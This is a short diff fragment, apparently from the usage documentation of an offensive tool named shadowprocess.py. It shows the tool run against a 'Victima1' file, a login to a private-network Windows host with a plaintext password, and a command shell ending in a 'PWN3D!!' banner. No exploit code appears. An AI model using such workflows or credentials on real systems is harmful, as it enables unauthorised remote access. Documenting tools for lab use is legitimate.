@@ -86,10 +86,14 @@ python3 ./shadowprocess.py ./Victima1.shp
 					[7] More...	
 					
 SHELL@shprocess $ 0 
+
+
 swadmin@192.168.100.228's password: Test123$$!#
 
 Microsoft Windows [Versión 10.0.19044.1889]
+
 (c) Microsoft Corporation. Todos los derechos reservados.
+
 swadmin@DESKTOP-I03VIOH C:\Users\swadmin> ¡¡PWN3D!!												
 
 
